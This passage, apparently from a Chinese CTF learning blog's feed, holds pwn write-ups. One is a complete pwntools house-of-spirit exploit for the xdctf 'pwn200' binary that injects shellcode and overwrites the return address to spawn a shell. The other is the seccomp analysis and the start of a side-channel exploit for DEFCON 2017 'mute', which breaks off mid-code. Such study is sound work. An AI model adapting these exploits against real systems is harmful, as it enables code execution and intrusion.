class=\"comment\">// [rsp+10h] [rbp-40h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v2[<span class=\"number\">48</span>]; <span class=\"comment\">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;who are u?&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0LL</span>; i &lt;= <span class=\"number\">47</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;v2[i], <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v2[i] == <span class=\"number\">10</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v2[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s, welcome to xdctf~\\n&quot;</span>, v2);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;give me your id ~~?&quot;</span>);</span><br><span class=\"line\">  sub_4007DF();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sub_400A29();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_4007DF</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> nptr[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">3</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;nptr[i], <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nptr[i] == <span class=\"number\">10</span> )  <span class=\"comment\">//换行</span></span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">      nptr[i] = <span class=\"number\">0</span>;  <span class=\"comment\">//空字符</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( nptr[i] &gt; <span class=\"number\">57</span> || nptr[i] &lt;= <span class=\"number\">47</span> ) <span class=\"comment\">// 如果不是数字的话,就打印出来(只读取一个了就),如果是的话,跳过</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;0x%x &quot;</span>, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)nptr[i]);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v2 = atoi(nptr);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> atoi(nptr);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t要先想办法泄露地址,输入回车的会被替换成0(就相当于字符串到最后了,被截断)</p>\n<p>​\t\t把前面修改为  0x40 fastbin大小,,然后进行free, 然后malloc获取到ret地址,然后就修改ret进行getshell</p>\n<h2 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h2><p>​\t\t不要遗漏每一个函数和语句!</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230607111909013.png\" alt=\"image-20230607111909013\"></p>\n<p>​\t\t输入48个A泄露rbp</p>\n<p>​\t\t</p>\n<h2 id=\"伪造chunk\"><a href=\"#伪造chunk\" class=\"headerlink\" title=\"伪造chunk\"></a>伪造chunk</h2><p>​\t\t这里是输入money那里,可以直接覆盖到ptr指针,把ptr覆盖了,覆盖成当前rbp的地址之前的某个位置,伪造chunk,free,然后再申请拿到这一块内存控制权限,然后就可以修改ret了,但是两个问题,</p>\n<p>​\t\t1.不知道libc的地址,知道的话,可以直接onegadget了,所以书中的解法是用了shellcode</p>\n<p>​\t\t2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230607114236103.png\" alt=\"image-20230607114236103\"></p>\n<p>​\t\t可以看一下最终的效果图,很清晰</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608201414380.png\" alt=\"image-20230608201414380\"></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io = remote(&#x27;0.0.0.0&#x27;, 10001)</span></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./pwn200&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.amd64.linux.sh(), arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak</span>():</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> fake_addr</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> shellcode_addr</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload = shellcode.rjust(<span class=\"number\">48</span>, <span class=\"string\">b&#x27;A&#x27;</span>)</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;who are u?\\n&quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">\tio.recvuntil(payload)</span><br><span class=\"line\">\trbp_addr = u64(io.recvn(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">\tshellcode_addr = rbp_addr - <span class=\"number\">0x20</span> - <span class=\"built_in\">len</span>(shellcode)</span><br><span class=\"line\">\tfake_addr = rbp_addr - <span class=\"number\">0x20</span> - <span class=\"number\">0x30</span> - <span class=\"number\">0x40</span>\t\t<span class=\"comment\"># make fake.size = 0x40</span></span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;shellcode address: 0x%x&quot;</span> % shellcode_addr)</span><br><span class=\"line\">\tlog.info(<span class=\"string\">&quot;fake chunk address: 0x%x&quot;</span> % fake_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">house_of_spirit</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;give me your id ~~?\\n&quot;</span>, <span class=\"string\">&#x27;65&#x27;</span>)\t<span class=\"comment\"># next.size = 0x41</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tfake_chunk  = p64(<span class=\"number\">0</span>) * <span class=\"number\">5</span></span><br><span class=\"line\">\tfake_chunk += p64(<span class=\"number\">0x41</span>)\t\t\t\t\t\t\t<span class=\"comment\"># fake.size</span></span><br><span class=\"line\">\tfake_chunk  = fake_chunk.ljust(<span class=\"number\">0x38</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">\tfake_chunk += p64(fake_addr)\t\t\t\t\t<span class=\"comment\"># overwrite pointer</span></span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;give me money~\\n&quot;</span>, fake_chunk)</span><br><span class=\"line\"></span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;choice : &quot;</span>, <span class=\"string\">&#x27;2&#x27;</span>)\t\t\t\t<span class=\"comment\"># free(fake_addr)</span></span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;choice : &quot;</span>, <span class=\"string\">&#x27;1&#x27;</span>)\t\t\t\t<span class=\"comment\"># malloc(fake_addr)</span></span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;long?&quot;</span>, <span class=\"string\">&#x27;48&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpayload = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">0x18</span></span><br><span class=\"line\">\tpayload += p64(shellcode_addr) \t\t\t\t\t<span class=\"comment\"># overwrite return address</span></span><br><span class=\"line\">\tpayload = payload.ljust(<span class=\"number\">48</span>, <span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">&quot;48\\n&quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pwn</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tio.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\">leak()</span><br><span class=\"line\">house_of_spirit()</span><br><span class=\"line\">pwn()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"排错\"><a href=\"#排错\" class=\"headerlink\" title=\"排错\"></a>排错</h3><p>​\t\t自己写的exp一直有问题,有一大片后面的选择\\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;EASY HOTEL&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\\n1. check in\\n2. check out\\n3. goodbye\\nyour choice :的输出</p>\n<p>​\t\t捣鼓半天是leak那里出问题了..一个回车引发的血案……….草……… 造成了后面一堆的错乱,<font color=\"red\">为啥gdb里不影响呢? </font></p>\n<p>​\t\t这里要用send,因为存在offbyone,所以不需要回车,可以正好填满缓冲区,然后把rbp打印出来</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leak</span>():</span><br><span class=\"line\"> <span class=\"number\">14</span>     <span class=\"keyword\">global</span> fake_addr,shellcode_addr</span><br><span class=\"line\"> <span class=\"number\">15</span>     payload = shellcode.rjust(<span class=\"number\">48</span>,<span class=\"string\">b&#x27;A&#x27;</span>)</span><br><span class=\"line\"> <span class=\"number\">16</span>     p.recvuntil(<span class=\"string\">&quot;who are u?\\n&quot;</span>)</span><br><span class=\"line\"> <span class=\"number\">17</span>     p.send(payload)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t感觉貌似就算输入48个字符和\\n,也不会有影响呀,是影响了后面的东西吗,比如这个\\n作为后面的输入了? <font color=\"red\">是的,是这样</font></p>\n<p>是的,理论上48个字符后,下一个字符,会放到ebp-0x38,也就是刚才输入的who are u后面的前方(不信可以输入49个a试试)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000400B1F                 call    sub_4007DF</span><br><span class=\"line\">.text:0000000000400B24                 cdqe</span><br><span class=\"line\">.text:0000000000400B26                 mov     [rbp+var_38], rax</span><br><span class=\"line\">.text:0000000000400B2A                 mov     eax, 0</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608202658654.png\" alt=\"image-20230608202658654\"></p>\n<p>​\t不正常的,不正常是因为\\n被give you id读取了,然后65\\n和give your money后面全乱了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608203836560.png\" alt=\"image-20230608203836560\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608200524103.png\" alt=\"image-20230608200524103\"></p>\n<p>​\t\t正常的(伪造这个0x41的位置),释放后再申请,前面18个随便填充,然后就覆盖返回地址了</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/image-20230608201414380.png\" alt=\"image-20230608201414380\"></p>\n<h1 id=\"待整理\"><a href=\"#待整理\" class=\"headerlink\" title=\"待整理\"></a>待整理</h1><p>​\t感觉貌似就算输入48个字符和\\n,也不会有影响呀,是影响了后面的东西吗,比如这个\\n作为后面的输入了? <font color=\"red\">是的,是这样</font></p>\n<p>程序运行起来了,接入pid调试</p>\n<p>,或者能不能直接看内存空间</p>\n<p>Gdb attach本地进程进去\t</p>\n<p>搞一搞pwntools,深入理解下</p>\n<p>house_of_spirit 也有一个send</p>\n<p>你的exp有问题…不过确实可以找一下其他的学一下</p>\n<p>​\t\t2.伪造chunk的话,需要满足一定约束,也就是它相邻的chunk的size域和那几个标志位,这个可以通过之前的输入id来解决</p>\n<p><a href=\"https://blog.csdn.net/sinat_35360663/article/details/128510319\">https://blog.csdn.net/sinat_35360663/article/details/128510319</a></p>\n<p>后面有个总结不错</p>\n<p>一个回车惹的祸…</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/",
            "title": "pwn入门-32-defcon2017资格赛-mute",
            "date_published": "2023-06-06T10:20:11.000Z",
            "content_html": "<p>​\t\t侧信道是个很有意思的东西…万物皆可侧信道…各种奇奇怪怪的方法</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/image-20230605223341877.png\" alt=\"image-20230605223341877\" style=\"zoom: 33%;\">\n\n\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-32-defcon2017%E8%B5%84%E6%A0%BC%E8%B5%9B-mute/image-20230606182030547.png\" alt=\"image-20230606182030547\" style=\"zoom:33%;\">\n\n\n\n\n\n<p><a href=\"https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute\">https://github.com/bannsec/CTF/tree/5e9bba7fa0f398257aae9f4754370aed647a079a/2017/DEFCON/mute</a></p>\n<p>​\t\t好多年前的defcon的题了,但现在来看也并不简单,一方面考察了脑洞,要想到侧信道的办法,另一方面要有比较深厚的计算机基础,比如了解系统调用,会写汇编,对汇编比较熟悉才能写出来exp.</p>\n<h2 id=\"程序分析\"><a href=\"#程序分析\" class=\"headerlink\" title=\"程序分析\"></a>程序分析</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *v3; <span class=\"comment\">// rdi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  buf = mmap(<span class=\"number\">0LL</span>, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">7</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;SILENCE, FOUL DAEMON!&quot;</span>);</span><br><span class=\"line\">  v3 = _bss_start;</span><br><span class=\"line\">  fflush(_bss_start);</span><br><span class=\"line\">  dropSyscalls(v3);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v5 != <span class=\"number\">4096</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v3 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">    v5 += read(<span class=\"number\">0</span>, buf, <span class=\"number\">4096</span> - v5);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (__fastcall *)(FILE *))buf)(v3);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t读取一段内容到buf,然后执行读取的内容,很明显,要读取一段shellcode,但是禁用了一些系统调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/side<span class=\"meta\"># seccomp-tools dump ./mute</span></span><br><span class=\"line\">SILENCE, FOUL DAEMON!</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> <span class=\"number\">0001</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x11</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) <span class=\"keyword\">goto</span> <span class=\"number\">0019</span></span><br><span class=\"line\"> <span class=\"number\">0002</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> <span class=\"number\">0003</span>: <span class=\"number\">0x35</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x40000000</span>  <span class=\"keyword\">if</span> (A &lt; <span class=\"number\">0x40000000</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0005</span></span><br><span class=\"line\"> <span class=\"number\">0004</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0e</span> <span class=\"number\">0xffffffff</span>  <span class=\"keyword\">if</span> (A != <span class=\"number\">0xffffffff</span>) <span class=\"keyword\">goto</span> <span class=\"number\">0019</span></span><br><span class=\"line\"> <span class=\"number\">0005</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x0c</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">if</span> (A == read) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0006</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x0b</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000002</span>  <span class=\"keyword\">if</span> (A == open) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0007</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x0a</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000003</span>  <span class=\"keyword\">if</span> (A == close) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0008</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x09</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  <span class=\"keyword\">if</span> (A == stat) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0009</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x08</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000005</span>  <span class=\"keyword\">if</span> (A == fstat) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0010</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x07</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000006</span>  <span class=\"keyword\">if</span> (A == lstat) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0011</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000007</span>  <span class=\"keyword\">if</span> (A == poll) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0012</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x05</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000008</span>  <span class=\"keyword\">if</span> (A == lseek) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0013</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x04</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000009</span>  <span class=\"keyword\">if</span> (A == mmap) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0014</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x03</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000000a</span>  <span class=\"keyword\">if</span> (A == mprotect) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0015</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x02</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000000b</span>  <span class=\"keyword\">if</span> (A == munmap) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0016</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x01</span> <span class=\"number\">0x00</span> <span class=\"number\">0x0000000c</span>  <span class=\"keyword\">if</span> (A == brk) <span class=\"keyword\">goto</span> <span class=\"number\">0018</span></span><br><span class=\"line\"> <span class=\"number\">0017</span>: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x0000003b</span>  <span class=\"keyword\">if</span> (A != execve) <span class=\"keyword\">goto</span> <span class=\"number\">0019</span></span><br><span class=\"line\"> <span class=\"number\">0018</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"> <span class=\"number\">0019</span>: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t诶 不是有execve吗,不能getshell吗</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>​\t\t思路是有的,但是编写exp就比较头疼,汇编比较渣,总之一步步来,先open read然后读每个字节,然后比较,(pwncollege好好打打基础!)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.update(arch=<span class=\"string\">&#x27;amd64&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>, log_level=<span class=\"string\">&#x27;ERROR&#x27;</span>)  <span class=\"comment\"># 这个必须加,不然shellcraft没法正确识别指令集</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">15</span>): <span class=\"comment\"># flag的位数,不知道就可以多写点</span></span><br><span class=\"line\">    c = <span class=\"number\">0</span>  <span class=\"comment\"># 存储字符的ascii码</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>): <span class=\"comment\"># 一个字符8位 循环每一位</span></span><br><span class=\"line\">        p = process(<span class=\"string\">&quot;./mute&quot;</span>)</span><br><span class=\"line\">        p.readline() </span><br><span class=\"line\"></span><br><span class=\"line\">        shellcode = shellcraft.<span class=\"built_in\">open</span>(<span 